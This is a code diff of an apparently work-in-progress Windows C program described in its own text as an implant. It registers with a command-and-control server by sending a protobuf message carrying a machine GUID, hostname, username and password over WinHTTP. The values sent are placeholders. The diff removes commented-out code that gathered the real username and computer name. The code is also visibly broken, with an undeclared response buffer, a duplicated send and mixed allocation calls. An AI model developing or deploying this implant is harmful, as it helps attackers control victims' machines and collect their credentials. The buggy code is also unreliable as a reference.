@@ -20,17 +20,17 @@
 LPBYTE *ImplantID;
 
 // Function to RegisterImplant message
-BYTE *EncodeRegisterImplant(ImplantCheckin *ri, size_t *bufferSize) {
+BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
 	bool status = pb_get_encoded_size(bufferSize, RegisterImplant_fields, ri);
 	if (!status) {
-		DEBUG_PRINTF("Failed to get ImplantCheckin size: \n");
+		DEBUG_PRINTF("Failed to get RegisterImplant size: \n");
 		return NULL;
 	}
 	
 	BYTE *registerBuffer = (BYTE *)malloc(*bufferSize);
 	pb_ostream_t stream = pb_ostream_from_buffer(registerBuffer, *bufferSize);
 	
-	status = pb_encode(&stream, ImplantCheckin_fields, ri);
+	status = pb_encode(&stream, RegisterImplant_fields, ri);
 	
 	if (!status) {
 		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
@@ -38,32 +38,45 @@ BYTE *EncodeRegisterImplant(ImplantCheckin *ri, size_t *bufferSize) {
 		return NULL;
 	}
 
-        printf("Successfully encoded: %llu\n", stream.bytes_written);
+        printf("[+] Successfully encoded: %llu\n", stream.bytes_written);
 	return registerBuffer;
 }
 
-LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, size_t bytes_written) {
+LPBYTE SendToServer(LPCWSTR VERB, LPCWSTR PATH, BYTE *buffer, size_t bytes_written) {
+	
+	DWORD dwSize = 0;
+	DWORD dwDownloaded = 0;
+	LPSTR pszOutBuffer;
+	BOOL  bResults = FALSE;
+	HINTERNET  hSession = NULL,
+		   hConnect = NULL,
+		   hRequest = NULL;
 
-        // Initialize WinHTTP and send the request
-        HINTERNET hSession = WinHttpOpen(L"A Custom User Agent",
+	// Use WinHttpOpen to obtain a session handle.
+        hSession = WinHttpOpen(L"A Custom User Agent",
                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME,
                         WINHTTP_NO_PROXY_BYPASS, 0);
+	
+        // Specify an HTTP server.
+	if (hSession) {
+		LPCWSTR SERVER_NAME = L"0.0.0.0";
+		hConnect = WinHttpConnect(hSession,
+				SERVER_NAME,
+				5000,
+				0);
+	}
 
-        LPCWSTR SERVER_NAME = L"0.0.0.0";
-        // SERVER_PORT = 5000;
-        HINTERNET hConnect = WinHttpConnect(hSession,
-                        SERVER_NAME,
-                        5000,
-                        0);
-
-        HINTERNET hRequest = WinHttpOpenRequest(hConnect,
-                        VERB,
-                        PATH,
-                        NULL,
-                        WINHTTP_NO_REFERER,
-                        WINHTTP_DEFAULT_ACCEPT_TYPES,
-                        0);
+	// Create an HTTP request handle.
+	if (hConnect) {
+		hRequest = WinHttpOpenRequest(hConnect,
+				VERB,
+				PATH,
+                                NULL,
+				WINHTTP_NO_REFERER,
+				WINHTTP_DEFAULT_ACCEPT_TYPES,
+				0);
+	}
 
 	// Set the Content-Type header
         WinHttpAddRequestHeaders(hRequest,
@@ -71,6 +84,17 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, size_t bytes_wri
                         -1,
                         WINHTTP_ADDREQ_FLAG_ADD);
 
+	printf("add headers good.\n");
+
+	// Send a request.
+	if (hRequest) {
+		bResults = WinHttpSendRequest(hRequest,
+				WINHTTP_NO_ADDITIONAL_HEADERS,
+				0,
+				WINHTTP_NO_REQUEST_DATA,
+				0,
+                                0,
+				0);
 
         // Send the request
         if (!WinHttpSendRequest(hRequest,
@@ -83,44 +107,73 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, size_t bytes_wri
                 printf("Failed to send request. Error: %ld\n", GetLastError());
         }
 
-        // Receive the response
-        if (WinHttpReceiveResponse(hRequest, NULL)) {
-                DWORD dwSize = 0;
-                DWORD dwDownloaded = 0;
-                LPSTR responseBuffer;
+	// End the request.
+	if (bResults) {
 
-		do {
-                        // Check for available data
-                        dwSize = 0;
-                        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
-                                printf("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
-                        }
-			// printf("dwSize = %lu", dwSize);
+        	// Receive the response
+        	if (WinHttpReceiveResponse(hRequest, NULL)) {
+			printf("recieved.\n");
 
-                        // Allocate space for the data
-                        responseBuffer = (LPSTR)malloc(dwSize + 1);
+			do {
+				      // Check for available data.
+      dwSize = 0;
+      if( !WinHttpQueryDataAvailable( hRequest, &dwSize ) )
+        printf( "Error %u in WinHttpQueryDataAvailable.\n",
+                GetLastError( ) );
 
-                        if (!responseBuffer) {
-                                printf("Out of memory\n");
-                                dwSize = 0;
-                        } else {
-                                // Read the data
-                                ZeroMemory(responseBuffer, dwSize + 1);
-                                if (!WinHttpReadData(hRequest,
-							(LPVOID)responseBuffer,
-                                                        dwSize,
-                                                        &dwDownloaded)) {
-                                        printf("Error %lu in WinHttpReadData.\n", GetLastError());
+      // Allocate space for the buffer.
+      pszOutBuffer = new char[dwSize+1];
+      if( !pszOutBuffer )
+      {
+        printf( "Out of memory\n" );
+        dwSize=0;
+      }
+      else
+      {
+        // Read the data.
+        ZeroMemory( pszOutBuffer, dwSize+1 );
+
+        if( !WinHttpReadData( hRequest, (LPVOID)pszOutBuffer,
+                              dwSize, &dwDownloaded ) )
+          printf( "Error %u in WinHttpReadData.\n", GetLastError( ) );
+        else
+          printf( "%s", pszOutBuffer );
+
+        // Free the memory allocated to the buffer.
+        delete [] pszOutBuffer;
+      }
+      /**
+				printf("Checking for available data.\n");
+                        	// Check for available data
+                        	dwSize = 0;
+                        	if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+                                	printf("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
+                        	}
+
+                        	// Allocate space for the data
+                        	responseBuffer = (BYTE *)malloc(dwSize + 1);
+				//pszOutBuffer = new char[dwSize+1];
+                        	if (!responseBuffer) {
+                                	printf("Out of memory\n");
+                                	dwSize = 0;
+                        	} else {
+					printf("Reading the data\n.");
+                                	// Read the data
+                                	ZeroMemory(responseBuffer, dwSize + 1);
+                                	if (!WinHttpReadData(hRequest,
+								(LPVOID)responseBuffer,
+								dwSize,
+                                                        	&dwDownloaded)) {
+                                        	printf("Error %lu in WinHttpReadData.\n", GetLastError());
 					
-                                } else {
-                                        printf("Server response: %s", responseBuffer);
-                                }
-
-                                // Free the memory allocated to the buffer
-                                // free(responseBuffer);
-                        }
-                } while (dwSize > 0);
-
+                                	} else {
+                                        	printf("Server response: %s", responseBuffer);
+                                	}
+                                	// Free the memory allocated to the buffer
+                                	// free(responseBuffer);
+                        	}**/
+                	} while (dwSize > 0);
+		}
 		// Clean up
 		WinHttpCloseHandle(hRequest);
 		WinHttpCloseHandle(hConnect);
@@ -128,13 +181,12 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, size_t bytes_wri
 
 		printf("responseBuffer = %s.", responseBuffer);
 		return responseBuffer;
-	} else {
-		// Clean up
-		WinHttpCloseHandle(hRequest);
-		WinHttpCloseHandle(hConnect);
-		WinHttpCloseHandle(hSession);
-		return "";
 	}
+	// Clean up
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	WinHttpCloseHandle(hSession);
+	return NULL;
 
 
 }
@@ -158,53 +210,24 @@ void ReadMachineGUID() {
 	}
 }
 
-size_t message_length;
 // Function to register Implant with the Server
 int RegisterSelf() {
 	RegisterImplant ri = RegisterImplant_init_zero;
 	
-	// ReadMachineGUID();
-
-	/**
-	DWORD dwSizeUser = MAX_PATH;
-	DWORD dwSizeHostname = MAX_PATH;
-	char username[MAX_PATH];
-	GetUserNameA(username, &dwSizeUser);
-	DEBUG_PRINTF("GetUsernameA = %s", username);
-	
-	char hostname[MAX_PATH];
-	GetComputerNameA(hostname, &dwSizeHostname);
-	DEBUG_PRINTF("GetComputerNameA = %s", username);
-
-	**/
-
 	ri.GUID = "1234567890";
 	ri.Hostname = "test";
 	ri.Username = "userwoozer";
 	ri.Password = "pass";
 
-	BYTE buffer[4096];
-	size_t bufferSize = sizeof(buffer);
+	size_t bufferSize = 0;
+	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &bufferSize);
 	
-	pb_ostream_t stream = pb_ostream_from_buffer(buffer, bufferSize);
+	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, bufferSize);
 	
-	bool status = pb_encode(&stream, Register_fields, &reg);
-	
-	if (!status) {
-		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
-		return 1;
-	}
-
-	BYTE *registerBuffer = EncodeImplantCheckin(&ri, &bufferSize);
-
-	/**
-	LPCSTR response = SentToServer(POST_VERB, REGISTER_PATH, buffer, stream.bytes_written);
-	
-	if (strcmp(response, "")){
+	if (response == NULL){
                 DEBUG_PRINTF("Bad response.");
-                // DEBUG_PRINTF("response = %s", response);
+                DEBUG_PRINTF("response = %s", response);
         }
-	**/
 	
 	return 0;
 }
@@ -216,34 +239,10 @@ int main() {
 	int result = RegisterSelf();
 
 	if (result == 1) {
-		DEBUG_PRINTF("Failed to Register with the Server!\n");
+		DEBUG_PRINTF("Failed to register with the Server!\n");
 		return 1;
 	}
-	printf("Successfully registered implant with Server!\n");
-
-	uint8_t buffer[128];
-	bool status;
-
-	/* Allocate space for the decoded message. */
-        RegisterImplant message = RegisterImplant_init_zero;
-
-        /* Create a stream that reads from the buffer. */
-        pb_istream_t stream = pb_istream_from_buffer(buffer, message_length);
-
-        /* Now we are ready to decode the message. */
-        status = pb_decode(&stream, RegisterImplant_fields, &message);
-
-        /* Check for errors... */
-        if (!status)
-        {
-            printf("Decoding failed: %s\n", PB_GET_ERROR(&stream));
-            return 1;
-        }
-
-	printf("%s\n", message.Username);
-        printf("%s\n", message.Password);
-        printf("%s\n", message.GUID);
-        printf("%s\n", message.Hostname);
+	printf("[+] Successfully registered Implant with Server!\n");
 
 	return 0;
 }
